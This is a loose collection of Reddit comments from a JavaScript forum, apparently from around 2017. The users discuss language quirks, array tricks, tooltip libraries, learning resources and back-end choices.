Since it's open source and in electron, it should not be that hard to run it on Windows.
looks like standardnotes, but isn't "vi NOTES" the standard note taking app for programmers?
[removed]
What the hell is this **[edit]** April Fools references
&gt; I think the larger point is that it wasn't some new paradigm that allowed you to shorten your code. He never claimed it was a new paradigm. 
arrow functions are always anonymous
I believe it is hoisted, but not assigned any variables in scope. So you wouldn't be able to do something like this: bar() var foo = function bar(){}
http://www.tutorialrepublic.com/codelab.php?topic=faq&amp;file=jquery-get-substring-between-the-two-words
A loading splash screen? Look, just because HTML5 can do most of what Flash can do, does not mean we have to do everything that Flash did.
A community of 105k who can hardly agree on anything.
I use the osx note app, just because my terminal is always on the far left desktop and notes can be anywhere. 
const foo = () =&gt; { };
i started it with only one account at 650 x, 550y , around below the rainbowroad
That makes a lot of sense. Thanks man!
How big have you seen the minimum footprint to be for Unity using WebAssembly? It might always be a bigger initial download but if someone is very skilled with Unity and C# and is not familiar with three.js and JavaScript, then Unity is a compelling option for that developer.
What's this for? I'd make a new string, iterate through the original string at the start index and push the letters into the new string and do this up until the end index. If you need more help, let me know but if it's for school or a code challenge you should try it yourself!
You can access individual characters in a string using array notation. Example: let str = "This is a test."; console.log(str[2]); Using that, you could loop through the string with an index to get the part of the string you want.
Surprisingly, no. In fact, it looks like if you assign bar to foo like that, `bar` doesn't get declared at all: https://jsfiddle.net/56boxfm0/
is a function invocation and a code execution not one and the same? genuinely curious :)
Yes there is a difference here. I believe that every function invocation is a code execution itself, but obviously not every code execution is a function invocation.
How do you link external libraries? 
Thank you! We've been using prompt() for a while so I think that's why I'm getting confused with the parsing. The isNaN was meant to be x and y (just anything that's not a number) but that isn't required of the assignment (just double checked) so I can exclude that example. The alert thing is something I completely overlooked! It's so nice to have a fresh pair of eyes (besides instructors) that can offer different perspectives. TL;DR: I need to learn to read a bit better haha :) Thank you and have a great day!
`let a = [1, 2, ...` * + No overhead for browser to compile * + No overhead for coder to understand what's happening * - Takes more typing to alter range/start/end/magnitude `let a = []; for (...` * + Easy to alter range, start/end/increment * + More compact for array range larger than ~15-20 * - Browser must compile/run as opposed to just storing initial values * - Depending on where snippet is, might have to compile many times * ? Browsers *might* be smart enough to optimize this to the runtime of the original statement, if snippet runs enough times * - Must call additional function `.push(...` * - More likely to cause an off-by-one error * - More likely to cause an infinite loop when altered * Change `i !== 11` to `i &lt;= 10` to nullify both previous points * - Two lines must be kept together, else `a` might not have `push` function causing `a.push(...` to throw an error * Fix by inlining `for` loop on the same line as `let a=[];` * + Makes you feel a little smarter for employing relevant tools and knowledge, good for morale ____ **TL;DR:** Factors that matter * How many times the snippet runs per page load * How large the array is * How often the coder/developer needs to modify the array * How they need to modify it (range, skip certain numbers, etc.) * How much speed/file-size requirements matter to the project
I see this being used more and more, but to be honest I don't like the look of this. Whatever is gained (what is even gained??) is completely lost in the visual disruption of having to grok the syntax.
I agree. I use it a lot with GraphQL queries, and it is handy. But I don't see much of an advantage over wrapping a string with a function. I guess the different syntax means editors can color code the strings differently depending on content. 
&gt;Debugging code where functions are reassigning functions outside their scope can be hell, because you can't even be sure the function foo you just defined will not be something entirely different the next time you call it. Have you ever actually seen anyone, ever, reassign a named function? That just seems like shitty code and is trivial to avoid regardless of code style.
You mean API docs? In that case JSDoc is the way to go. It has the best support out there, so you'll be good with it.
`let a = _.range(1, 11)` `let b = _.range(1, 1001)`
Maybe these links will help: [Adrian Hecker's 3D Chessboard Blender Models](https://bl.ocks.org/starcalibre/f0ce91448c076f2d43074dcef5bdfb16) [GitHub - Vitse - Three.js GameBox](https://github.com/vitse/threejs-gamebox)
Tagged template functions get passed the parameters differently than just invoking the function normally.
Where were you six months ago when I was custom engineering a tooltip solution?
Here's another small demo (deskop only): http://alive-chairs.surge.sh
Impossible (as in your editor, build process and CI server all yelling at you if you try) always beats "easy to avoid". After ten years of JavaScript, there's few things that would surprise me when it comes to code people, myself included, have written. The whole point of ESLint is to avoid bad practice and enforce good practice. You might not put octal literals in your code and imagine nobody else would either, but there's little reason to not have "no-octal" in your config (it's default for eslint:recommended set anyway) I'd say defining functions in a way that doesn't allow hoisting or reassignment is good practice and a good reason for the rule. Not to mention consistency and uniform style. Besides, even if I don't agree with whatever rules a project enforces, I still prefer having rules.
One of the only real use cases I can think of is when you need to construct injection-vulnerable strings in JavaScript, like SQL. const results = await execute`select * from users where email=${emailAddress};` Then you could do the following: function execute(parts: string[], ...interpolations: string[]) { // parts is ['select * from users where email=', ';'] // interpolations is [emailAddress] const parameterisedQueryString = parts.join('?') return sequelize.query(parameterisedQueryString, { replacements: interpolations }) } In my opinion that would read better than: const results = await execute( 'select * from users where email=?', emailAddress ) Especially when you had lots of entries. This would also work nicely (potentially) with HTML etc. I originally thought it might be useful for translations, but that idea kinda falls over because you can only pass one string to a function like this so it would be a little awkward to do pluralisation.
[Array.prototype.fill](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Array/fill)
What is `this` for each invocation?
Nope, try it here: https://jsfiddle.net/495f1d1q/ Logs `Failure ReferenceError: unnamed is not defined` twice, it's not defined before or after being assigned to a variable.
I prefer not using an array at all. If I want to get a value from that array like below: var value = a[b]; I'd rather use: var value = b+1; However, if the use of an array can not be avoided, I'd prefer the first method. However, if the size of that code exceeds the one for the second method, I'd use the second method.
It would be ES8, not ES7. It would be more correct to call it ES2017.
you could just look up slice and copy that function's code
Yep. Kinda disappointing. I tried to think of as many ways as I could before opening it and could only think of those. Then I opened it and said, "Oh."
How does this handle really large tooltips that could be scrolled out of the viewport?
Hello Human JS interpreter, I need you. 
This looks very cool, but an issue I've run into on a site I dev on is if you have a lot of defined tooltips (1000+, showing full details on ellipses'd data) the DOM operations just kill the browser. So... does this library use a single DOM element and dynamically change it per request, or does it pollute the DOM with one element per tooltip? As a tooltip is kinda by definition a single instance onscreen, then it makes sense to only have a single DOM element that gets updated with the content and position on each request. Anyway... this is what I ended up rolling on my own as no other tooltip library (at the time) seemed to use a single DOM element (anyone know why this would be a bad idea?).
Was definitely one of the best April fools jokes this year. 
What do you do with graphQL? It sounds pretty neat. 
The scroll on that page really lags for some reason. I'm using Chromium v56.0 on Linux.
I mean in js "shellcode" and/or general (hand) obfuscation. Otherwise, not a whole lot outside of edge cases. But edge cases are fun, and knowing about them makes you a better programmer. 
My wild guess is to have dynamic content or even forms per tooltip. Plus you can have tooltips inside (interactive) tooltips.
Yes, it's an error, and should be. It's crap. But if the reason for not allowing function declaration is: &gt;Function declarations are hoisted, which means that it‚Äôs easy - too easy - to reference the function before it is defined in the file I'm just trying to point out that you don't solve it by using a variable instead.
There's a dedicated DOM element per tooltip (like every other lib for whatever reason). When I've had many (1000+) on my pages other libs lag because of the polluted DOM while my own rolled tooltip lib (too ugly to share) that reuses a single DOM element cures the issues... so probably the extra DOM elements/ops t'would be my guess.
Tooltips in tooltips, I'll give ya (if you're into that kinda thing ;). Plus that feels like the kinda thing you could turn on/off should you wanna do that kind of thing, or have a flag that says "dedicated DOM element for this one, please" But my (ugly) own rolled lib has complex templates that, mind you, get re"compiled" each time but it flys compared to everything else.
it's possible to save the tooltip content in session storage and reuse it each time, I guess. but for the hell of me I can't find the link to the github project XD. Anyway, doesn't popper have tooltip.js? I'm not sure what's the advantages of tippy.js over it (or even venerable qtip2)
Frankly, I think it's just laziness/no other devs have thought about the fact that there's (generally) only one tooltip onscreen at a time. Mix in the rarity of having more than a few dozen on any given page and it's an ignored issue/edge case. I guess I should clean up my code and release a tooltip lib that allows for tons on a given page...
Been using this for a couple days now, absolutely love it. Thank you!
Well done and good luck! It's great to feel those creative juices flowing. 
The shorter, possibly less efficient variant: Array(10).map((_, i) =&gt; i + 1)
No, that's for a uniform value
Hi all, This is a fun little tool I made. If you have any feedback or make anything cool with it, please let me know. Thanks!
Algorithms? For web development? Can't think of a case I've needed them for.
I use markdown files. I love the format enough that I wrote a markup parser for CLI (node) that does lists, tables, heaadings, syntax coloring, indentation, word wrap and a bunch of other stuff. That way when I need to access documentation its just right there at my finger tips.
I was never very impressed with any of the Atom autocomplete extensions. Intellisense in VS code is really fantastic, though.
There's some errors in the part covering error handling (around 12:30). A try-catch around an async function won't capture async errors. Only a try-catch in an async function can handle promise-based/awaited errors. Outside of async, it can only handle synchronous (thrown) errors. Errors in an aysnc function become rejected promises, even if synchronous errors, and will go unnoticed in a non-async try-catch. The top section of code in that sample is correct, but not the bottom. Also, the `catch()` being called off of `quote` in the async function is incorrect. `quote` would be the resolved value from from the `request()` call and wouldn't be a promise from which you could catch(), because it was awaited. This would be OK if the `await` for `request()` was removed because then `quote` would be a promise. In doing that, however, the `json().catch()` sample below wouldn't work. For that, the `await` is still needed (just don't try to `.catch()` from `quote` ;)
I spent a good 3 hours trying to solve this problem, and eventually just switched back to the JetBrains IDEs. Atom is cool with customization, but sometimes I just want things to work without having to spend hours getting it there.
It's something good to have in your repertoire; can come in handy for back-end or quick front-end calculations.
Do the files you are trying to import have an export statement? export default XXX or similar?
psayre23 might be talking about [graphql-tag](https://www.npmjs.com/package/graphql-tag) 
I can, and have on the job. Typically, the logic should be handled on the back end, but that isn't always the case. If you're including back end when you say "web development" and you are creating complex SQL queries and surrounding logic then algorithms are definitely important as well. 
But that presupposes knowledge of graphql, and something to print. I have neither lol, though its now on my to look up list in my github. 
Its hard not to shit on medium.com posts for this exact reason. So much shovelware blog trash. 
I'm just here for the thumbnail. 
It's very simplified, but the idea is to convert the original application into smaller pieces or microservices if you will. You could even break out more functionality into other services/apis. IMO the idea behind microservices is not more complex than breaking out small (micro) responsibilities and composing a distributed system from all the different pieces. 
OH SURE, JUST LEARN A BACKEND LANGUAGE, YOU FUCKING DINKSHITE TOOL.
They're standard node modules like react, jquery, and lodash; I can't tell since they're each made up of many files.
Wow this is pretty clever. I have an app in production that emits web socket events on deployment that prompt the user to refresh, I could see this being an improvement.
You're going to have a busy 2017 if you need to learn all of these. Especially since it's already April.
Thank you!
Thanks man.
Cool, I will add that to the list.
fillRect? drawImage?
Great job. I built a project and was looking for something like this, but all I could find were some PHP scripts in Gists from 2007. I wound up just implementing it in my Node.js app and building in some testing methods. :(
But that's exactly what something like Firebase allows for. Instant updates to a database which then gets propagated properly to the other clients. Unless you want to code your own minimal ws solution, I think you'd be fine off with firebase.
Huh, I never knew you could have a space in between the tag and the string. You forgot to use a backtick for your opening quote mark though.
Need something for automating deployments, like ansible/chef/puppet or maybe docker.
Yeah, it does pollute the DOM. I might change it so it appends/removes instead
I've been a web developer for 20+ years and I've yet to use PHP. I'm sure there are developers out there who do use it, I've just never met them. In the old days popular languages were Java and ColdFusion and Ruby. Nowadays I mostly find people using Python, Node, or some newer language like Go. YMMV. 
This is cool, and I understand this is just a simple demo, but there are two huge problems with it. First, the ENTIRE HTML document is replaced on every single keystroke. So two people really can't type at the same time, not even in different paragraphs. Each keystroke will revert the other's entire document. Second, this is enormously wasteful on bandwidth. Imagine a medium-to-large document, where the whole thing is sent over the wire for each keystroke. This design really only works for tiny little demos. As a proof of concept, however, this is cool. Not sure why Pusher.com is needed tho. Could be done with WebSockets and simple Node.js server IMHO. Check out: https://github.com/ritzyed/ritzy
This a more than most people I meet learn in a whole CS degree. You really have to work on your skills constantly (and outside the classroom/bootcamp!) if you're serious about a career in web dev.
You know, ColdFusion was just a JVM language. Some of the modern equivalents would be Clojure, Groovy, Scala, jRuby, and jPython.
Any plans for a React component? This would be awesome for React.
Eh? Not really. 1. HTML/CSS - if you can't pick this up at a functional level in a few weeks, you need to return your CS degree. That's assuming you never spent some time learning this in class or on your own. 2. Javascript - see #1. ES6 is a little more involved, but the concepts are familiar once you learn the syntax. 3. Backend - You likely cut your teeth on Java and C++. See #2 for javascript. You have had some experience with C# and Python. PHP will make you laugh then cry then laugh again, but it's still familiar. Objective-C is a little different, but same concepts. RoR is nice, and you can pick it up in a few weeks of dedicated study or a few months of weekends. 4. You don't need Mongo. You can get by with a standard SQL database. You already know this from 3. 5. REST is a concept. It's an afternoon. You're already familiar with APIs and interfaces. 6. Structure? At #6? Really? That should be learned at #2. Every CS grad knows this at least as a concept. 7. GIT? Again, another afternoon, and you've likely already used this. 8. Algorithms and Big O. Alright. You don't need to know this. CS graduates should, but not everyone will. In the real world, it's fine. Use a library and let the experts handle it. Time different implementations of your own code when you have time to see which is best for your style. Yes. I know there are better ways to do this, but let's be honest. Google isn't going to hire a self-taught programmer without some serious cred already under their belts. When you need this. You'll learn it, if you don't already know it. So no, a CS degree will teach you all of this and more. Make that should. You will have the opportunity to learn this in a classical setting. If you don't, you basically did the nerd version of a party school. 
A busy April maybe, if you're any kind of developer already.
I didn't know Meteor was still popular, I thought it was a fad. 
Why not nodejs for backend? Edit: Downvoting is fine, go right ahead but I'm really interested in opinions as I have little to no experience with node and I was actually thinking about learning it to do some server-side stuff.
Yep, that's the one!
I'm on mobile, and backticks suck on iOS. Glad people figured it out even though I was technically wrong. 
Without knowing more details about your problem, I'd suggest maybe starting with some pseudocode first? You have a problem, and you know theoretically how to solve it. With some pseudo code, it could actually inform you on what you can search to be able to write the actual code. For example, there's a really simple question where you have to use JS to output some text if the current date is April 1st, 2017. Your pseudo code would be like: if currentDate is (April 1st, 2017) output "Happy April Fools" Now you can go Google how to properly write an if statement, how to get current date, how to compare dates, and how to output strings in JS.
I just leave it here - https://github.com/ghaiklor/terminal-canvas and https://www.youtube.com/watch?v=_KpDKTihgxY Your tool is using ffmpeg and image-to-ascii packages, there are nothing left to do for converting a video to ascii sprite... worthless work, just for fun - ok, just for reddit - no, IMO.
There's no reason why you shouldn't, go for it! Just from context, I can only assume you were down voted for implying node wasn't talked about for a reason. That probably wasn't the case and op might have just forgot to mention it. 
What would you recommend focusing your attention on as a full stack dev in 2017?
He makes mention of javascript, ie node, in the backend point. Nothing wrong with node. &gt; See #2 for javascript. 
 function sub (str, start, end) { var newstr = '' for(var i = 0; i &lt; str.length; ++i) { if(i &gt;= start &amp;&amp; i &lt; end) { newstr += str[i] } } return newstr }
Yea, it's basically a convenience wrapper for the creation portion of it. It simply scripts out the portion of using ffmpeg to create the images and write them to a temp file, then read that file in and send each image through image-to-ascii and take the resulting output from each call to image-to-ascii and builds it up in a javascript array which it then writes to an output file and then cleans up the temp directory where the images were written to. It's just a thing I made that I was having some fun with and I figured other people might as well. "Worthless work" may be a little harsh, but thanks for the feedback:)
Well... Its the same a trying to speak another language, you know what you want to say, but you dont know the WORDS or their ORDER. You only need to google what you want to do and LEARN it. I know how to program in javascript but i often google several times the same thing and put it on mycode until it starts to stick on my memory. Dont be shy to google what you sre traying to do and paste it. Sooner or later you will memorize it and repeat it automatically. Good luck.
Oftentimes you don't even get any error.
It says 5 JS Frameworks on the link then you need to click to go to another page which has 6 JS frameworks to look for in 2017 which 3 are outdated and one is NodeJS. This is a joke
Do you mind sharing it? (I would live to use something like this)
Sorry - my bad! I'll cease and desist. Thanks for the heads up!
Really? In 20+ years you've not met *one* PHP developer?!
Unfortunately that gives an array of length 10 of undefined, rather than 1 to 11
I'd suggest otherwise. I think for most of the problems he encounters he cannot google "how to get to point B" because that'll be such an abstract problem. What I suggest (if you have the basics ready with your programming language) to go back to the super-basics, learn the foundations (and not code examples on freecodecamp.com). If you know what tools you have, and what tools do what, I'm sure you'll be smart enough to put your tools to good use. As your language analogy goes, you can't google full sentences as google's translate is not good enough to handle language specialities (it may work for spanish, but I challenge you to translate anything from-to hungarian).
As somebody who frequently build this: it turns out that you have different needs every time. And this one don't support the most usual one for me: being able to efficiently support thousands of dynamically generated moving elements (meaning you can't afford to have different elements or even JS objects, you must use delegation and on-demand generated tooltip content).
Console.log all the things \o/
Apologies i am fairly new to JScript, **Context:** I have a local website that serves as a sort of portfolio site of design work for the company. &amp;nbsp; &amp;nbsp; **What I want to do:** Create a link that will take the user to a random project on the website, there are around 2700 projects that match the criteria for which i have generated the links.&amp;nbsp; **Problem:** The above script would take days to enter each line for these 2700 links, so i am looking for a easier way to write it, e.g can i write it to remove the page[0], so i can just copy, paste with some minor editing? Or can i write it to generate the project ID number instead? e.g: http://website/domain/projdetails.jsp?projectID=00002_000000**6977**
Is this just syntactical sugar? Article says you can avoid complex iterations but I don't see what's the difference between `unshift()` and `push()` etc...
Okay, now it makes more sense, however, your previous code snippet doesn't do anything like this, this is why it was hard to figure out. I'll comment a solution in another comment in 5 minutes.
Oh don't get me wrong we have a lot in common, we play the same games, have the same but differing interests, like the same shows and amines, etc. I just want to know a little bit about code and Java to surprise him and have an in depth conversation about it with him as opposed to being super clueless
Instead of trying to learn this on your own, why not make it a "bonding" experience that you'd like him to explain some stuff to you? As a programmer myself, I love whenever my SO wants to hear about or want to understand a subject I'm interested in, and the greatest part of that feeling is getting to tell her.
oh. map doesn‚Äôt affect empty slots. then you have to do something like Array(10).fill(0).map((_, i) =&gt; i + 1)
Thanks for the suggestion! It does indeed look like what I was asking for. I will check it out
On the other hand, you *may* enjoy programming. Note that Java and JavaScript are two quite different programming languages. However, the latter is a better language for getting started. These are two books that help you do that: * [JavaScript for Kids](https://www.nostarch.com/javascriptforkids) * [Coding for visual learners](http://www.codingforvisuallearners.com/)
Yeah stuff like knowing that Java and JavaScript are two different things is very helpful lol. Thank you for the books will definetly be checking them out
There is no cure for cancer - neither the disease not the programming language. Jokes aside, because of all the quirks of JS, it is indeed a hard task to create a comprehensive type system for it.
Fastboot is great, but solving a different problem. The solution I'm looking for would need to be responsible for the data, on the client, after the initial request is done. 
You don't need to use docker. Correct. In some cases you even shouldn't use docker. But it's a game changer and for a lot of devs (myself included) it completely changes the way you think about applications and is a fundamental abstraction that is critical to making you a more well rounded developer. More points if you know how to create pipelines (I.e. jenkins, bamboo or similar) and deploy to a container orchestration layer (e.g. kubernetes, rancher, ECS). I can't remember who's talk I'm quoting when I say this, but it's obvious that the current trend is that devops engineers will, for the most part, end up being merged into the responsibility of devs. There will be no more devops... they will eventually just be developers. You don't need to know how to deploy Netflix, you just need to understand roughly what docker is and how the big players use it. edit1: forgot a word 
https://github.com/prettydiff/biddle It is the markdown command.
I can't suggest any books per say. Youtube is a great resource for me. However I would be looking at the following for the future... * JSON data type - calling data over HTTP and how to manipulate this in JS * Frameworks like AngularJs &amp; React * ES6 and compilers like Babel * NodeJS (JS for the backend) - Amazing. 
https://www.youtube.com/watch?v=cXgA1d_E-jY and https://youtu.be/urR596FsU68 https://www.youtube.com/watch?v=uITcoKpbQq4 maybe.. but there are tons of videos. subscribe he does about 1 video a week.
Thank you! :)
Oh, and for the sake of humanity, don't call it JScript :D It's Javascript.
it's like 2008 called and wants its hacks back. 
It is total nonsense. - it makes an array with 3 urls - it makes a function, that returns a random number between 1-3 - it takes that random number's url from the array - and redirects to that url In essence, as you load the page, you'll be redirected to one of these urls, but you want links, rather than immediate random redirect. 
i never comment on reddit and i don't have any advice for u but this is some cute shit
Yes I'm used to JetBrains as well and I was giving a try on Atom (saw some videos it seemed that autocomplete was better).
You cant just pull a website as json, as websites are html and are normally restricted so only scripts on the site are able to access the sites data, You will need an API endpoint or server setup that returns json, fortunately there are API's out there you can play around with like. --------------------- https://jsonplaceholder.typicode.com/ they have instruction how to get a Get if your using jQuery. -------------- here are some weather apis http://openweathermap.org/current#geo this guys talking about using this api. https://medium.freecodecamp.com/building-a-weather-app-a3cec42b11fa
Check these two but i would suggest javascript.info and ofc mdn documentation
The list isn't terrible. It just doesn't contain any new information over the past few years. I would add more javascript tooling: babel, typescript, webpack, gulp, etc. I would add tools that extend and automate CSS generation, like sass and less. I would talk more about npm and its alternatives like yarn. Basically if you're wiring you project together manually and don't have any automation in your build you're going to look like a rookie. 
/r/cringe Programmers hate it when they hear unqualified people talk about things they have a vague understanding of. Programmers *detest* it when that thing is programming. Just be yourself.
This looks like a *Legally Blonde* situation to me. Hang in there! I have a feeling you‚Äôll discover you have a real passion for JavaScripting and will soon surpass him as a coder. Learning to program isn‚Äôt hard at all, but tech communities tend to be very toxic. Good luck on your journey!
I'd recommend reading the comments on this post from /r/webdev: https://np.reddit.com/r/webdev/comments/62e5hj/12_extremely_useful_hacks_for_javascript/
I really dislike some of these. Things like doing code!! To convert to boolean is so easy to miss when you're scanning through code. Let a minifier deal with that stuff, just write it properly.
Yes, author is extremely ignorant.
Do you mean json embedded in the html or you want to convert the html into json?
so I guess a fair takeaway is: "if you see any of these twelve patterns in someone's code, someone's about to have a teachable moment?" 
oh yes, i didn't even think of that.. Thanks for the resources, planning to stick with JavaScript for now.. 
A modern JIT compile JS engine should be bright enough to optimise out the invariant, yes. If you do anything complex with the array in the loop, or call functions that might do, the optimiser might chose not to take the risk because it doesn't have time to do all the analysis necessary to make sure the optimisation is safe (due to the halting problem) and even for simple loops there are a number of reasons the engine might not fully optimise a function anyway, so manually removing invariants from loops if it doesn't result in a significant reduction in code clarity is a good habit just-in-case. For a list of reasons that V8 (and therefore Chrome and Node) won't optimise a function _at all_ see https://github.com/vhf/v8-bailout-reasons - I'm sure there are similar considerations in other engines. I tend to assume that worst: that my code is going to be interpreted literally and not compiled/optimised at all, so unless I'm making the code unclear (maintainability tends to be a priority over pure speed) I make sure the code is optimal for this. In fact some transformations to achieve that can make code clearer: double win. If the engine would compile and manage to optimise the code then it should equally manage to do so with the the manually optimised version resulting in no worse performance. _Of course this only matters for tight loops with many iterations._ Something that iterates a just few times is going to see no benefit and with a complex loop you'll find the end-of-loop check's complexity is completely dwarfed by the body of the loop so optimising it is unlikely to be good use of your time.
It was a true years ago, it's definitely not the case today.
In order to pull jsonp from an external origin, the endpoint needs to format the response body in a very specific way (the response body is basically a Javascript function that invokes a callback to return the json you want). If the externally hosted endpoint that you want to make a jsonp request to doesn't format their response body in this way, then the browser will prevent you from accessing that sites data via the same-origin policy that others have alluded to. 
Work on listening. It's irrelevant to arbitrarily know a ton about what he's talking about (especially with programming where the field is so broad). Knowing his interests seems like something that would make a big difference but it really doesn't matter. My ex loved to ride horses. I didn't go and take riding lessons, I listened to her talk about it and went to see her ride and that's how I learned enough to talk to and connect with her about it.
If you are a fan of online videos, EdX's [CS50](https://www.edx.org/course/introduction-computer-science-harvardx-cs50x) course might be worth considering. Also, YouTube has tons of resources. The best might be Daniel Shiffman's [Coding Train](http://thecodingtrain.com/) channel or [Derek Banas](https://www.youtube.com/user/derekbanas)' channel.
I work on a big scale (6 billion requests a month) front-end and back-end distributable system fully built on top of CoffeeScript... We all know it's gonna be an ass to change it, this can come handy for anyone having the same issue... I would say one thing: Start removing coffee specific features for new code and for existing one in small changes. This way, CoffeeScript can be strangled out without a lot of code changes coming from a big bang.
This is a minor thing, but note that you posted this in /r/javascript , and the person you are asking about is studying the Java language. Bizarrely, despite the naming similarity, these languages (javascript and Java) have profound differences.
^This.
Was about to close the tab at !!, but decided to stop fiddling with my pubes and do some interwebz investigayshun for da peeples. So the linked article on medium is by John Howard, dated Mar 29 2017. But, there is another article on the interwebz by Caio Ribeiro Pereira, here (dated April 2016): https://blog.jscrambler.com/12-extremely-useful-hacks-for-javascript/ And they are remarkably similar!
Not every declaration is a variable declaration, named functions for instance. Even more true in es6, where we have classes. If your background is Java, I would guess that JavaScript's soft typing will probably take more getting used to than anything else. Types in JavaScript are dynamic and can often be coerced to other types implicitly, which can be useful or dangerous if you don't keep an eye on it (or use a type checking tool like flow or typescript). I will say that at the end of the day, it's not hard to figure out the type of a variable, you can mostly rely on typeof to check what something is (note that arrays are objects though).
Pre-med? No offense, but how can you be pre-med but this shallow in overall thought? Guess booksmart really does exist.. No offense honestly I just think you have to be trolling.
start with a function that accepts this both parameters you mentioned. This would be already better than nothing.
If you haven't tried solving this problem yourself, nobody is going to help you. This sub doesn't do people's homework. 
Interesting! What types of businesses have you generally worked in? I may be biased, being a recovering PHP developer myself.
1, 2, 3, 5 (its been long time not an issue for modern ES engines), 6 (unless you are sure "in" is what you want, most of the time you hasOwnProperty; prototypacal inheritance), 7 (horrible...), 8 (horrible...) are horrible advices. Others are fine.
If you don't know how to start try a tutorial about JS online. For example https://www.w3schools.com/js/js_functions.asp
Was it always? I was under the impression that the move to the JVM came later in CF's lifecycle. It's hard to compare it with the others listed as well since they fall under a more general purpose language vs CF being almost entirely web specific.
OMG. I run an engineering team that does heavy JavaScript and if any one does the first few of those hacks they get a "talking to". That is some of the worst advise ever for JavaScript. e.g. !!foo , +str , conected &amp;&amp; login() Either some Jr. Engineer is going to WTF? that and/or think its a bug a fix it by removing a ! , +. 
According to the Wikipedia article the jvm version was released in 2002. So, about 15 years ago. I actually know some developers who work full a local web development firm that still swear by CF (though they use an open source version called Lucee). From what I've seen the cfscript version of CF looks like pretty much any programming language. 
I didn't down vote you, but you could use node. I just bucket node with #2. Frankly, it's all down to personal preference for 90% of the applications out there. You won't be in a position to gauge which is better for a specific project until you know multiple languages anyway, and even then it'll probably boil down to the current stack. 
Hopefully a webpack ~~loader~~ plugin comes out for this. Edit: meant plugin, not loader
Thanks for your answer. I already kinda do this in my head. The YouTuber CodingTutorials360 suggests writing it on a whiteboard, I'm going to try that. 
There are actually some use cases where it's better to use +, but only in extremely hot codepaths - the benefits are entirely negligible for non-huge N. 
You are setting the font size from localstorage only inside your click, i think you want to do this also outside the click so it's done on page load. if (localStorage &amp;&amp; localStorage.getItem('newFontSize')) { var fontSize = localStorage.getItem('newFontSize'); $('html').css('font-size', fontSize+'px') } $('.text_increase').on('click', function() { var fontSize = $('html').css('font-size'); var newFontSize = parseInt(fontSize)+1; $('html').css('font-size', newFontSize+'px') if(localStorage) { localStorage.setItem('newFontSize', newFontSize); } }) 
I had forgotten about [TypeORM](https://github.com/typeorm/typeorm), this one is a bit younger, and probably has some bugs and I'm not sure how strong the browser use cases are..
Don't actually use this function, ever const largestValue = (a,f)=&gt;a.map(c=&gt;c&gt;f?c:f).sort().reverse()[0] largestValue([16, 14, 81, 23], 56);
(a, f) =\&gt; Math.max(f, ...a)
Meh. I have written window.someCache = window.someCache || {}; Before. I don't see the problem with this one. Others aren't great, sure, and I'd avoid them, but a few of them are usable. Also, you need to know all of them if you ever read legacy code.
How do I know if I'm learning ES6 or plain js(if it's called so)?
You'll need that all in the same tag. &lt;script type="text/javascript" src="toggle.js"&gt; &lt;/script&gt; Also, it looks like you are mixing single and double quotes in the first tag, that could also contribute to the problem. 
Can you stop posting this crap?
Does Safari show css as well, or just js?
That's what I said, "it'll be true". But the example is bad, since with `-1` I don't really have any money but it will say I do. edit* A better example would be to check if a property exists, like const user = { name: 'foo', email: 'foo@bar.com' } const hasAddress = !!user.address // false user.address = { street: 'baz', zip: '1234' } const hasAddress2 = !!user.address // true
Lol, the part loading FontAwesome is marked *not used* while the part using FontAwesome is marked *used*. Either the code is smart enough to figure out that the font wasn't loaded because it's installed locally which is misleading because almost nobody has FontAwesome installed or the code is too stupid to figure out that `font-family: FontAwesome` links to `@font-face`.
Uh, what is this?
Is there a way to export used parts of the file so that it could be used as an alternative to critical css tools? 
I'm 90% sure that this myth comes from older languages that ran a `len` function on arrays. For instance, to get the length of an array in C, you type `len(yourArray)`, and it runs the `len` function on `yourArray`. I'm also 99% sure that this is optimized away in all modern compilers for said older languages, and has never been the case for JavaScript anyway, since it's not a function, it's a property of the `Array` object, and so should just be a quick check, just like with an extraneous variable.
ES6 is just a bunch of new features added to JavaScript. It's all still JS. Check out the features here: https://github.com/lukehoban/es6features#ecmascript-6-gitioes6features
[removed]
Your message is complete nonsense. I sure hope you're trolling.
His objection is the opposite - that even "years ago" it would not cause any issues, because the length of an array is always known, not computed on the fly.
Hi /u/Nuqa-Duck, this post was removed. Please see our [posting guidelines](http://www.reddit.com/r/javascript/wiki/index).
I agree- but admit that I am guilty of the bad habit writing `!!foo` at times when I don't want to write `typeof foo !== 'undefined' &amp;&amp; foo !== null`. I am by no means a JS expert, so I'm curious- do you recommend always writing some form of the latter? Alternatively- what is your suggestion for a concise and clear way to check a variables existence? 
Thanks! I actually found this confusing at first: (acc[char] || 0) + 1; but now I like it far more than what I did and I see your point. Technically it's actually the anonymous function called by foreach that mutates the ret variable right? Would that be even worse? Would it be the parents, parent scope? I'm not a programmer but just trying to learn. Thanks for the feedback and help. 
You fixed it. Scroll is smooth again in my browser.
You should read [Netflix's technology blog](http://techblog.netflix.com).
&gt; JavaScript has first-class-functions (1), thats why you can assign functions to variables. JavaScript has no classes like Java does. Just some food for thought about phrasing. We could also say JavaScript has [first-class classes](https://www.reddit.com/r/javascript/comments/5z2mfg/firstclass_classes/), and that JavaScript has no functions *like Java does*.
So then do you prefer when checking for falsy values, your engineers write `!Boolean(foo);`? Not trying to justify the use of `!!`, but I do think it's not the worst offender as its very clear, and saves at least 7 keystrokes. I realize minification will take care of this, but `!!` is also much [faster](https://jsfiddle.net/vzxnacg6/)
aha, got me. Nice one.
&gt; Is there any advantage in considering so? Yes, JS is more dynamic because things like that. You can easily switch for example one function into another during runtime. You can use lambda functions (I heard that in new versions of Java this is also possible). You can create new functions dynamically... This gives huge power to developer, JavaScript is very expressive and flexible because of that. I think it's programmer productivity gain (less time for battle with language itself, more pure creativity). But there are some disadvantages. Because of dynamism, language is no longer static, so support for JS in IDEs is not even close to what you have for Java. 
Will def check it out, looking forward to going through the 'Practical Redux' series. Thanks again!
Even if that was true, why would it complete loading immediately once I refresh the window? edit: found the issue - I was trying to include some css &amp; js files in the head of the document, but since I'm using relative paths and the window is created dynamically it never resolves. Still not sure why reloading the window closes the requests though.
What you're describing is actually going to be fairly difficult to accomplish in a browser. If you don't know where to start, you'd be better off hiring someone to do it for you.
Thanks, I think that's a very good analysis. How experienced are you in programming?
I agree with /u/fuck_with_me . I honestly wouldn't know where to begin with this or if I even should try it as I don't know if/how the added complexity would even help me.
I think it's pretty great, however we've stopped using it at our workplace as people have trouble learning it up. Very easy to implement things the wrong way unless you know it well.
